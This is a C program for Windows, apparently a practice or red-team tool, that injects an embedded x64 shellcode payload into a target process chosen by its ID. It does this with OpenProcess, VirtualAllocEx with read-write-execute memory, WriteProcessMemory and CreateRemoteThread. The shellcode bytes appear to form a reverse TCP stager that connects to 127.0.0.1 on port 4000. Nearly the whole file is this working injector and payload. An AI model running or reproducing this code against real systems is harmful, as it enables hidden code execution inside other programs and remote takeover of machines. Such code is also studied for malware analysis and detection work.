#include <stdio.h>
#include <windows.h>

// Initialize struactures and store them as variables set to NULL
DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;

//! Shellcode payload
unsigned char vomit[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48"
"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b"
"\x42\x3c\x41\x51\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x8b\x48\x18\x50\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x4d\x31\xc9"
"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x48\x01"
"\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x0f\xa0\x7f\x00\x00\x01\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d"
"\x2a\x0a\x41\x89\xda\xff\xd5";


int main(int argc, char* argv[]) {

    // If the program is called with insufficient arguments, inform the user how to run this executable
    if (argc < 2) {

        printf("\n(*) Usage:\n\tshot.exe <PID> | open handle to process\n\tshot.exe | shows usage menu\n\n");

        return 0;
    }

    // Convert PID string to an integer
    PID = atoi(argv[1]);

    // If PID input is invalid
    if (PID == 0) {

        printf("\n[-] Invalid PID | PID returned 0\n\t(Error: %ld)\n\tFor usage, try: shot.exe\n\n", GetLastError());
        
        return 1;
    }

    // Inform user the argument was successful and that the program is attempting to open a handle to the process
    printf("\n[~] Attempting to open a handle to process (PID: %ld)\n", PID);

    // Open a handle to the process and store it in the process handle
    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, // Desired access
        FALSE, // Handle inheritance
        PID // Process ID
    );

    // If hProcess returns NULL, inform user and display the last error, then exit with failure
    if (hProcess == NULL) {

        printf("\n[-] Failed to open handle to the process (PID: %ld)\n\t(Error: %ld)\n\n", PID, GetLastError());

        return 1;
    } else {

        printf("\n[+] Handle to process opened\n\tPID: %ld\n\tHANDLE: 0x%p\n", PID, hProcess); // If not, inform the user of success and provide information about the process

    }

    // Allocate bytes to process memory and store it in the buffer
    rBuffer = VirtualAllocEx(
        hProcess, // Process handle
        NULL, // Base address specification
        sizeof(vomit), // Size allocated
        MEM_COMMIT | MEM_RESERVE, // Type of memory allocation
        PAGE_EXECUTE_READWRITE // Memory permissions
    );

    // Inform user details of rBuffer
    printf("\n[~] Allocating %zu bytes with rwx permissions\n", sizeof(vomit));


    // Attempt to write the allocated memory to process memory, inform user and exit with failure if writing fails
    if(!WriteProcessMemory(
        hProcess, // Process handle
        rBuffer, // Base address specification
        vomit, // Shell code
        sizeof(vomit), // Size of shell code
        NULL // Pointer for size of shell code
    )){

        printf("\n[-] Failed to write to process memory\n\t(Error: %ld)\n\n", GetLastError()); 

        return 1;
    } else {

        printf("\n[+] Wrote to process memory\n\tPID: %ld\n\tHANDLE: 0x%p\n\tBYTES: %zu bytes\n", PID, hProcess, sizeof(vomit)); // If successful, inform user

    }

    // Create thread to run waywode and save it to the thread handle
    hThread = CreateRemoteThread(
        hProcess, // Process handle
         NULL, // Security descriptor
         0, // Size for executable
         (LPTHREAD_START_ROUTINE)rBuffer, 
         NULL, // Starting address of thread 
         0, // Varibale to store start address 
         &TID // Time to run
         );

    // Check if thread was created successfully, inform user of outcome
    if (hThread == NULL){

        printf("\n[-] Failed to get a handle to the thread, closing process handle\n\tPID: %ld\n\tHANDLE: 0x%p\n\t(Error: %ld)\n\n", PID, hProcess, GetLastError());

        CloseHandle(hProcess); // Close the handle to the process if thread handle could not be created

        return 1;
    } /*else {

        printf("\n[+] Handle to thread created\n\tPID: %ld\n\tPROCESS HANDLE: 0x%p\n\tTID: %ld\n\tTHREAD HANDLE: 0x%p", PID, hProcess, TID, hThread); 

    }*/

    // Wait for application to close
    WaitForSingleObject(hThread, INFINITE);

    //Clean up and inform user
    printf("\nCleaning up...\n");
    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("\nCleaning finished\n\n");

    return 0;
}